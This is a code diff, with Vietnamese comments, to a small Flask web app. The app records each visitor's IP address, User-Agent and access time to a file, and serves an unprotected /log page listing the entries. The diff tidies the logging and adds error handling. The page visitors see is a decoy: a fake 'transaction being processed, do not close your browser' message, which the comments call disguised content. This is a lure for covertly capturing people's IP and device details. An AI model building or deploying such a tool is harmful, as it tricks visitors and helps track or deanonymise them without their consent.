@@ -5,28 +5,32 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    # Lấy IP từ header đúng cách
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip and ',' in ip:
-        ip = ip.split(',')[0].strip()
+    # Lấy IP thật từ X-Forwarded-For (dành cho reverse proxy)
+    forwarded_for = request.headers.get('X-Forwarded-For', '')
+    ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
 
-    # Lấy thông tin User-Agent
-    ua = request.headers.get('User-Agent')
+    # Lấy User-Agent
+    ua = request.headers.get('User-Agent', 'Unknown')
 
-    # Thời gian hiện tại
+    # Ghi thời gian hiện tại
     now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    # Ghi log vào file
-    log = f"{now} - IP: {ip} - Agent: {ua}\n"
-    with open("ip_log.txt", "a", encoding='utf-8') as f:
-        f.write(log)
+    # Ghi log IP + thiết bị + thời gian
+    log = f"{now} | IP: {ip} | Agent: {ua}\n"
 
-    # Trả về nội dung giả dạng một giao dịch đang xử lý
+    try:
+        with open("ip_log.txt", "a", encoding="utf-8") as f:
+            f.write(log)
+    except Exception as e:
+        return f"Log ghi thất bại: {e}"
+
+    # Trả về nội dung ngụy trang
     return '''
     <html>
       <head><title>Đang xử lý giao dịch</title></head>
       <body style="font-family:sans-serif;text-align:center;margin-top:100px;">
-        <h2>Giao dịch đang được xác minh, vui lòng không thoát trình duyệt...</h2>
+        <h2>🔄 Giao dịch đang được xử lý...</h2>
+        <p>Vui lòng không thoát trình duyệt trong khi hệ thống xác minh.</p>
       </body>
     </html>
     '''
@@ -34,7 +38,9 @@ def index():
 @app.route('/log')
 def view_log():
     try:
-        with open("ip_log.txt", "r", encoding='utf-8') as f:
+        with open("ip_log.txt", "r", encoding="utf-8") as f:
             return f"<pre>{f.read()}</pre>"
     except FileNotFoundError:
-        return "Chưa có dữ liệu truy cập nào được ghi lại."
+        return "❌ Chưa có dữ liệu IP truy cập."
+    except Exception as e:
+        return f"Lỗi khi đọc log: {e}"
